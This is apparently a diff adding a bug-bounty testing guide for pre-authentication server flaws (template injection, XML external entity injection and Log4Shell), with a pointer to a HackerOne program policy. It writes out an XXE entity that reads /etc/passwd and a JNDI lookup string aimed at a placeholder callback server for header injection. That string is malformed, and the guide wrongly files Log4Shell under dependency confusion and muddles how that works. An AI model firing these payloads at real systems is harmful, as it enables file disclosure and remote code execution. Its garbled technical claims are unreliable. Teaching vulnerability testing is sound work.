@@ -1,0 +1,42 @@
+Advanced pre-authentication infrastructure flaws occur entirely outside user accounts, focusing on server-side vulnerabilities such as zero-day framework flaws, blind server-side template injection (SSTI), and XML external entity (XXE) injection. These vulnerabilities, including Log4Shell and specialized input manipulation, allow for unauthenticated remote code execution or data exposure. The final defense strategy relies on manual, specialized testing rather than automated, noisy scanning. [1] 
+
+The list of pre-authentication vulnerabilities that can be discovered completely outside a user account concludes with the following structural flaws, along with the precise methodologies security researchers use to manually evaluate them. [1] 
+------------------------------
+## 1. Server-Side Template Injection (SSTI)
+
+* What it is: Occurs when an application unsafely passes user input directly into a dynamic backend templating engine (like Twig, Jinja2, or FreeMarker) instead of handling it as static data. [2, 3] 
+* How it is tested:
+1. Identify public unauthenticated input fields that generate dynamic text responses, such as a language selector string, a public forum comment interface, or a registration confirmation response page.
+   2. Input generic mathematical evaluation strings used specifically for template parsing discovery: ${7*7} or {{7*7}}.
+   3. Analyze the reflected output. If the webpage processes the raw math and explicitly prints 49 instead of literal text, an active template injection vulnerability is confirmed. [4, 5, 6, 7, 8] 
+
+## 2. XML External Entity (XXE) Injection
+
+* What it is: Affects public endpoints processing XML structural data format documents. An attacker manipulates the standard data structure to reference external system files or cloud configurations. [9, 10] 
+* How it is tested:
+1. Locate public unauthenticated endpoints processing incoming data streams, such as an identity check document processing engine, a profile backup data upload interface, or a checkout payment confirmation routine.
+   2. Intercept the network communication log payload via a proxy client.
+   3. Modify the document structure initialization parameters by injecting a standard system entity definition reference string:
+   
+   <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+   <user>&xxe;</user>
+   
+   4. Submit the modified package. If the server application returns an confirmation text object displaying backend system configuration text files, an active data exposure vulnerability exists.
+
+## 3. Dependency Confusion & Zero-Day Framework Flaws
+
+* What it is: Exploiting globally known software flaws (like Log4Shell) or targeting how third-party package frameworks load source files before checking session parameters. [11] 
+* How it is tested:
+1. Intercept every standard network communication parameter header submitted to the main landing page or registration interface.
+   2. Append specialized test lookup injection strings directly into common browser data fields such as the User-Agent, X-Forwarded-For, or generic tracking identifiers:
+   ${jndi:ldap://your_collaboration_://server.com}
+   3. Monitor an external network traffic listener utility. If the remote application server initiates a background callback lookup execution request to your external listening device, an unauthenticated infrastructure flaw is validated. [12, 13, 14] 
+
+------------------------------
+## Manual Verification Strategy
+Automated scanners generate massive, noisy log results that often lead to inaccurate findings. To successfully identify legitimate high-paying structural bugs, human validation of the HTTP server responses is strictly required. [15, 16, 17] 
+
+* The [1Win HackerOne Testing Window](https://hackerone.com/1win_com/policy_versions): If you choose to manually evaluate these vulnerabilities on the live production environment, you must adhere strictly to the operational bounds defined by the platform policy. Automated testing tool limits must remain strictly below 5 concurrent requests per second to prevent platform disruption. [18] 
+
+
+
